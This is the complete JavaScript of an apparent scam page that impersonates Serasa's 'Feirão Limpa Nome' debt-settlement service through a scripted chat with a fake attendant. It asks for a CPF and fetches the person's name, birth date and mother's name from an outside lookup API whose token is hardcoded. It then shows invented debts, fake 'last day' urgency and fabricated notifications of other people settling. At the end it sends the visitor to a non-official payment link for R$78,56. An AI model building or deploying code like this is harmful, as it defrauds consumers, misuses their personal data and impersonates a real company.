// ===== CONFIGURAÇÕES =====
const CONFIG = {
    apiUrl: 'https://cpf.zealpriv8.lat/api/cpf',
    apiToken: 'MtQHMyXrsqMlWoVQBz6DyOD4wSZ0oieql6nXIokN',
    gateway: 'https://clkdmg.site/pay/99-de-desconto-acordo',
    valor: '78,56',
    desconto: '99',
    score: '890'
};

// ===== DETECTA CAMINHO BASE AUTOMATICAMENTE =====
const getBasePath = () => {
    const path = window.location.pathname;
    const lastSlash = path.lastIndexOf('/');
    return path.substring(0, lastSlash + 1);
};

const basePath = getBasePath();
console.log('Base path:', basePath);

// ===== ELEMENTOS =====
const chatBody = document.getElementById('chatBody');
const cpfInput = document.getElementById('cpfInput');
const inputArea = document.getElementById('inputArea');
let userData = null;
let acordoNum = '';

const nomes = ["Ricardo", "Ana", "Marcelo", "Beatriz", "Felipe", "Juliana", "Marcos", "Patrícia", "Sandra", "Lucas"];

// ===== HELPERS =====
function getTime() {
    const now = new Date();
    return `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}`;
}

function scrollToBottom() {
    setTimeout(() => chatBody.scrollTop = chatBody.scrollHeight, 100);
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function gerarAcordoNum() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let r = '';
    for (let i = 0; i < 12; i++) r += chars[Math.floor(Math.random() * chars.length)];
    return r.slice(0, 3) + '-' + r.slice(3, 7) + '-' + r.slice(7, 11) + 'E';
}

// ===== TYPING =====
function showTyping() {
    const existing = document.getElementById('typingIndicator');
    if (existing && existing.id === 'typingIndicator') existing.remove();
    const div = document.createElement('div');
    div.className = 'typing-indicator';
    div.id = 'typingIndicator';
    div.innerHTML = `<div class="typing-dots"><span></span><span></span><span></span></div>`;
    chatBody.appendChild(div);
    scrollToBottom();
}

function hideTyping() {
    const el = document.getElementById('typingIndicator');
    if (el) el.remove();
}

// ===== MENSAGENS =====
function addMessage(side, content, isHTML = false) {
    hideTyping();
    const row = document.createElement('div');
    row.className = `msg-row ${side}`;
    if (isHTML) {
        row.innerHTML = `<div>${content}</div>`;
    } else {
        row.innerHTML = `<div class="msg-bubble"><span class="msg-content">${content}</span><span class="msg-time">${getTime()}</span></div>`;
    }
    chatBody.appendChild(row);
    scrollToBottom();
}

function addButtons(buttons) {
    const container = document.createElement('div');
    container.className = 'btn-container';
    buttons.forEach(btn => {
        const b = document.createElement('button');
        b.className = `btn-option ${btn.class || 'btn-primary'}`;
        if (btn.large) b.classList.add('btn-large');
        b.textContent = btn.text;
        b.onclick = () => {
            addMessage('right', btn.text);
            container.remove();
            if (btn.action) btn.action();
        };
        container.appendChild(b);
    });
    chatBody.appendChild(container);
    scrollToBottom();
}

function addCard(html) {
    hideTyping();
    const row = document.createElement('div');
    row.className = 'msg-row left';
    row.innerHTML = `<div style="width:100%">${html}</div>`;
    chatBody.appendChild(row);
    scrollToBottom();
}

// ===== VÍDEO =====
function addVideo(videoSrc, titulo = '') {
    hideTyping();
    const row = document.createElement('div');
    row.className = 'msg-row left';
    row.innerHTML = `
        <div style="max-width:280px; border-radius:12px; overflow:hidden; background:#000;">
            ${titulo ? `<div style="background:var(--rosa-serasa); color:white; padding:6px 10px; font-size:11px; text-align:center;">${titulo}</div>` : ''}
            <video controls style="width:100%; display:block;" preload="metadata">
                <source src="${videoSrc}" type="video/mp4">
            </video>
        </div>
    `;
    chatBody.appendChild(row);
    scrollToBottom();
}

// ===== ÁUDIO =====
function addAudio(audioSrc, onEndCallback = null) {
    hideTyping();
    const row = document.createElement('div');
    row.className = 'msg-row left';
    
    const bars = [];
    for (let i = 0; i < 25; i++) {
        bars.push(`<div class="bar" style="height:${Math.floor(Math.random() * 20 + 5)}px"></div>`);
    }
    
    const audioId = 'audio_' + Date.now();
    row.innerHTML = `
        <div class="audio-msg">
            <button class="audio-play-btn" id="${audioId}_btn">▶</button>
            <div style="flex:1">
                <div class="audio-wave">${bars.join('')}</div>
                <div class="audio-time"><span id="${audioId}_time">0:00</span> / <span id="${audioId}_dur">---</span></div>
            </div>
            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='45' fill='%23e10075'/%3E%3Ctext x='50' y='67' font-size='40' text-anchor='middle' fill='white'%3EF%3C/text%3E%3C/svg%3E" style="width:34px; height:34px; border-radius:50%;">
            <audio id="${audioId}" preload="auto"></audio>
        </div>
    `;
    chatBody.appendChild(row);
    scrollToBottom();

    const audio = document.getElementById(audioId);
    const durSpan = document.getElementById(`${audioId}_dur`);
    const timeSpan = document.getElementById(`${audioId}_time`);
    const playBtn = document.getElementById(`${audioId}_btn`);

    audio.addEventListener('loadedmetadata', () => {
        const mins = Math.floor(audio.duration / 60);
        const secs = Math.floor(audio.duration % 60);
        durSpan.textContent = `${mins}:${secs.toString().padStart(2, '0')}`;
    });
    
    audio.addEventListener('timeupdate', () => {
        const mins = Math.floor(audio.currentTime / 60);
        const secs = Math.floor(audio.currentTime % 60);
        timeSpan.textContent = `${mins}:${secs.toString().padStart(2, '0')}`;
        const pct = audio.currentTime / (audio.duration || 1);
        row.querySelectorAll('.bar').forEach((b, i) => {
            b.classList.toggle('active', i / 25 < pct);
        });
    });
    
    audio.addEventListener('ended', () => {
        playBtn.textContent = '▶';
        row.querySelectorAll('.bar').forEach(b => b.classList.remove('active'));
        timeSpan.textContent = '0:00';
        if (onEndCallback) onEndCallback();
    });
    
    playBtn.onclick = () => {
        if (audio.paused) {
            audio.play().then(() => playBtn.textContent = '❚❚').catch(e => console.log('Erro:', e));
        } else {
            audio.pause();
            playBtn.textContent = '▶';
        }
    };
    
    audio.src = audioSrc;
    audio.load();
}

// ===== API CPF =====
async function consultarCPF(cpf) {
    const cpfClean = cpf.replace(/\D/g, '');
    try {
        const res = await fetch(`${CONFIG.apiUrl}?token=${CONFIG.apiToken}&cpf=${cpfClean}`);
        if (!res.ok) throw new Error('CPF não encontrado');
        const data = await res.json();
        return {
            CPF: data.data.cpf,
            NOME: data.data.nome,
            NASC: data.data.nascimento,
            NOME_MAE: data.data.mae
        };
    } catch (error) {
        console.error('Erro API:', error);
        throw error;
    }
}

// ===== NOTIFICAÇÕES =====
function playNotificationSound() {
    try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        if (ctx.state === 'suspended') ctx.resume();
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.frequency.value = 800;
        gain.gain.setValueAtTime(0.3, ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
        osc.start();
        osc.stop(ctx.currentTime + 0.3);
    } catch(e) {}
}

function showAttendantNotification() {
    const notif = document.createElement('div');
    notif.style.cssText = 'position:fixed;top:60px;left:50%;transform:translateX(-50%);background:linear-gradient(135deg,#e10075,#c90068);color:white;padding:12px 24px;border-radius:20px;font-weight:bold;z-index:2000;animation:slideDown 0.4s ease,slideUp 0.4s ease 3.6s forwards';
    notif.textContent = 'Atendente Fernanda entrou na conversa';
    document.body.appendChild(notif);
    setTimeout(() => notif.remove(), 4000);
}

function initNotificacoes() {
    setInterval(() => {
        const oficial = document.getElementById('notifOficial');
        const feirao = document.getElementById('notifFeirao');
        if (oficial && feirao) {
            oficial.classList.add('show');
            setTimeout(() => oficial.classList.remove('show'), 6000);
            setTimeout(() => {
                feirao.classList.add('show');
                setTimeout(() => feirao.classList.remove('show'), 8000);
            }, 5000);
        }
    }, 180000);
    
    const cicloOnline = () => {
        const el = document.getElementById('notifOnline');
        const txt = document.getElementById('txtOnline');
        if (el && txt) {
            txt.innerHTML = Math.random() > 0.5 ? `<strong>${Math.floor(Math.random() * 50 + 120)}</strong> pessoas online` : `<strong>${Math.floor(Math.random() * 10 + 5)}</strong> entraram agora`;
            el.classList.add('show');
            setTimeout(() => el.classList.remove('show'), 6000);
            setTimeout(cicloOnline, Math.random() * 10000 + 20000);
        }
    };
    
    const cicloAcordos = () => {
        const el = document.getElementById('cardAcordo');
        const txt = document.getElementById('txtAcordo');
        if (el && txt) {
            const nome = nomes[Math.floor(Math.random() * nomes.length)];
            const rand = Math.random();
            if (rand < 0.33) txt.innerHTML = `${nome} finalizando acordo...`;
            else if (rand < 0.66) txt.innerHTML = `${nome} quitou por R$ ${(Math.random() * 18 + 81).toFixed(2).replace('.', ',')}`;
            else txt.innerHTML = `${nome} quitou por R$ ${(Math.random() * 80 + 370).toFixed(2).replace('.', ',')}`;
            el.classList.add('show');
            setTimeout(() => el.classList.remove('show'), 5000);
            setTimeout(cicloAcordos, Math.random() * 10000 + 12000);
        }
    };
    cicloOnline();
    cicloAcordos();
}

// ===== MÁSCARA CPF =====
if (cpfInput) {
    cpfInput.addEventListener('input', function(e) {
        let v = e.target.value.replace(/\D/g, '');
        if (v.length > 11) v = v.slice(0, 11);
        if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
        else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
        else if (v.length > 3) v = v.replace(/(\d{3})(\d{1,3})/, '$1.$2');
        e.target.value = v;
    });
    cpfInput.addEventListener('keypress', e => { if (e.key === 'Enter') enviarCPF(); });
}

const sendBtn = document.getElementById('sendBtn');
if (sendBtn) sendBtn.onclick = enviarCPF;

// ===== FUNIL =====
async function iniciarFunil() {
    console.log('Funil iniciado');
    await delay(2000);
    addMessage('left', 'Bem-vindo! Para encontrar uma proposta, informe seu CPF para verificação. 🔍');
}

async function enviarCPF() {
    const cpf = cpfInput.value.trim();
    if (cpf.replace(/\D/g, '').length !== 11) {
        alert('Digite um CPF válido com 11 dígitos.');
        return;
    }
    
    addMessage('right', cpf);
    inputArea.classList.add('hidden');
    showTyping();
    await delay(3000);
    
    try {
        userData = await consultarCPF(cpf);
        console.log('Dados:', userData);
        
        // Dispara evento de Lead do Facebook Pixel
        if (typeof fbq !== 'undefined') {
            fbq('track', 'Lead', {
                content_name: 'Lead Serasa Limpa Nome',
                cpf: userData.CPF.substring(0, 6) + '***'
            });
            console.log('✅ Facebook Pixel: Lead disparado');
        }
    } catch(e) {
        hideTyping();
        addMessage('left', '❌ CPF não encontrado. Verifique e tente novamente.');
        inputArea.classList.remove('hidden');
        return;
    }
    
    hideTyping();
    acordoNum = gerarAcordoNum();
    
    addMessage('left', `Olá, <strong>${userData.NOME}</strong>.<br>Bem-vindo ao atendimento oficial Serasa Limpa Nome. Seus dados estão protegidos e seguros conosco. 🔐<br>Um de nossos atendentes entrará em breve para te auxiliar.`);
    await delay(2000);
    
    playNotificationSound();
    showAttendantNotification();
    addMessage('left', '<strong>Atendente Fernanda</strong> entrou na conversa!');
    await delay(1500);
    
    addVideo('video/saudacao.mp4', '📹 Atendente Fernanda');
    await delay(500);
    addAudio('audio/1audio.mp3');
    await delay(500);
    
    addButtons([{ text: 'CONTINUAR', class: 'btn-primary btn-large', large: true, action: etapaConfirmacaoDados }]);
}

async function etapaConfirmacaoDados() {
    showTyping();
    await delay(2000);
    addMessage('left', 'Por gentileza, confirme se os dados abaixo estão corretos:');
    await delay(1500);
    addCard(`
        <div class="card-dados">
            <div class="dado-row"><div class="dado-label">Nome completo:</div><div class="dado-value">${userData.NOME}</div></div>
            <div class="dado-row"><div class="dado-label">Data de nascimento:</div><div class="dado-value">${userData.NASC}</div></div>
            <div class="dado-row"><div class="dado-label">Nome da mãe:</div><div class="dado-value">${userData.NOME_MAE}</div></div>
        </div>
    `);
    await delay(2000);
    addButtons([{ text: 'Sim, está correto', class: 'btn-primary', action: etapaAcessoAprovado }]);
}

async function etapaAcessoAprovado() {
    showTyping();
    await delay(2000);
    addMessage('left', '✅ Verificação concluída com sucesso!');
    await delay(1500);
    
    addVideo('video/provasocial.mp4', '📹 Depoimentos reais');
    await delay(2000);
    
    addMessage('left', `Este é o maior Feirão Limpa Nome de 2026. Em parceria com o programa <strong>Desenrola Brasil</strong>, oferecemos até <strong>${CONFIG.desconto}% de desconto</strong> para quitar suas dívidas. São mais de 400 empresas participantes.`);
    await delay(2000);
    addMessage('left', `Você deseja aproveitar o <strong>último dia do Feirão</strong>?`);
    await delay(1500);
    addButtons([{ text: 'SIM, QUERO NEGOCIAR', class: 'btn-primary btn-large', large: true, action: etapaAnaliseSituacao }]);
}

async function etapaAnaliseSituacao() {
    showTyping();
    await delay(2000);
    addMessage('left', `Analisando CPF <strong>${userData.CPF}</strong>... ⏳`);
    await delay(3000);
    addMessage('left', `Identificamos <strong>4 dívidas ativas</strong> no sistema (R$1.928 a R$9.878).<br><br>Você tem até <strong>HOJE</strong> para regularizar.<br><br><strong style="color:red;">NEGATIVADO 🚫</strong>`);
    await delay(2000);
    addMessage('left', `${userData.NOME}, deseja verificar <strong>acordos com desconto</strong> para seu CPF? 💰`);
    await delay(1500);
    addButtons([{ text: 'BUSCAR ACORDO', class: 'btn-primary btn-large', large: true, action: etapaBuscarAcordo }]);
}

async function etapaBuscarAcordo() {
    showTyping();
    await delay(2000);
    addMessage('left', `Verificando acordos para CPF ${userData.CPF}... 🔎`);
    await delay(3000);
    addMessage('left', '✅ <strong>Acordo encontrado!</strong> Proposta exclusiva disponível!');
    await delay(1500);
    addButtons([{ text: 'VER MEU ACORDO', class: 'btn-primary btn-large', large: true, action: etapaVerAcordo }]);
}

async function etapaVerAcordo() {
    showTyping();
    await delay(2000);
    addAudio('audio/2audio.mp3');
    await delay(1500);
    addMessage('left', `🎉 Parabéns <strong>${userData.NOME}</strong>! <strong style="color:var(--rosa-serasa);">${CONFIG.desconto}% DE DESCONTO</strong> para você!`);
    await delay(2000);
    addCard(`
        <div class="acordo-card">
            <div class="acordo-header">Feirão Limpa Nome - Serasa</div>
            <div style="margin-bottom:10px;"><span style="font-size:12px;color:#999;">Acordo:</span><span class="acordo-num">${acordoNum}</span></div>
            <div><strong>${userData.NOME}</strong></div>
            <div>CPF: ${userData.CPF}</div>
            <div style="margin:10px 0;">✅ ${CONFIG.desconto}% desconto<br>✅ Blindagem CPF<br>✅ Score ${CONFIG.score} pontos</div>
            <div style="font-size:18px;"><strong style="color:var(--rosa-serasa);">R$ ${CONFIG.valor}</strong></div>
        </div>
    `);
    await delay(2000);
    addButtons([{ text: 'CONFIRMAR ACORDO', class: 'btn-primary btn-large', large: true, action: etapaConfirmarAcordo }]);
}

async function etapaConfirmarAcordo() {
    showTyping();
    await delay(2000);
    addMessage('left', '✅ Acordo confirmado com sucesso!');
    await delay(1500);
    addAudio('audio/3audio.mp3');
    await delay(2000);
    addCard(`
        <div class="card-dados">
            <div class="dado-row"><div class="dado-label">Nome:</div><div class="dado-value">${userData.NOME}</div></div>
            <div class="dado-row"><div class="dado-label">CPF:</div><div class="dado-value">${userData.CPF}</div></div>
            <div class="dado-row"><div class="dado-label">Nascimento:</div><div class="dado-value">${userData.NASC}</div></div>
            <div class="dado-row"><div class="dado-label">Mãe:</div><div class="dado-value">${userData.NOME_MAE}</div></div>
            <div class="dado-row"><div class="dado-label">Score:</div><div class="dado-value">105 - Baixo</div></div>
        </div>
    `);
    await delay(1500);
    addCard(`
        <div class="acordo-card">
            <div class="acordo-header">Acordo Confirmado</div>
            <div>Código: ${acordoNum}</div>
            <div style="margin:10px 0;"><strong>${CONFIG.score} pontos no score</strong></div>
            <div><strong style="color:var(--rosa-serasa);">R$ ${CONFIG.valor}</strong></div>
        </div>
    `);
    await delay(2000);
    addButtons([{ text: 'PAGAMENTO', class: 'btn-primary btn-large', large: true, action: etapaPagamento }]);
}

async function etapaPagamento() {
    showTyping();
    await delay(1500);
    addMessage('left', `Gerando link seguro... 🔒`);
    await delay(2500);
    addMessage('left', `✅ Link pronto!<br><br>Acordo: ${acordoNum}<br>Valor: <strong style="color:var(--rosa-serasa);">R$ ${CONFIG.valor}</strong><br>Desconto: ${CONFIG.desconto}%<br>Score: ${CONFIG.score}`);
    await delay(2000);
    addButtons([{ text: 'REALIZAR PAGAMENTO', class: 'btn-primary btn-large', large: true, action: () => {
        addMessage('left', '🔄 Processando...');
        
        // DISPARA EVENTO DE COMPRA DO FACEBOOK PIXEL
        if (typeof fbq !== 'undefined') {
            const valorNumerico = parseFloat(CONFIG.valor.replace(',', '.'));
            fbq('track', 'Purchase', {
                value: valorNumerico,
                currency: 'BRL',
                content_name: 'Acordo Serasa 99% OFF',
                content_type: 'product',
                content_ids: [acordoNum],
                contents: [{
                    id: acordoNum,
                    quantity: 1,
                    item_price: valorNumerico
                }]
            });
            console.log('🔥 Facebook Pixel: Purchase disparado! Valor: R$ ' + CONFIG.valor);
        } else {
            console.log('❌ Facebook Pixel não encontrado!');
        }
        
        // Redireciona para o novo gateway
        setTimeout(() => {
            window.location.href = CONFIG.gateway + window.location.search;
        }, 600);
    }}]);
}

// ===== INICIALIZAÇÃO =====
const styleAnim = document.createElement('style');
styleAnim.textContent = `
    @keyframes slideDown {
        from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
        to { opacity: 1; transform: translateX(-50%) translateY(0); }
    }
    @keyframes slideUp {
        from { opacity: 1; transform: translateX(-50%) translateY(0); }
        to { opacity: 0; transform: translateX(-50%) translateY(-20px); }
    }
`;
document.head.appendChild(styleAnim);

// Aguarda o DOM carregar completamente
document.addEventListener('DOMContentLoaded', () => {
    console.log('DOM carregado, iniciando chat...');
    initNotificacoes();
    iniciarFunil();
});
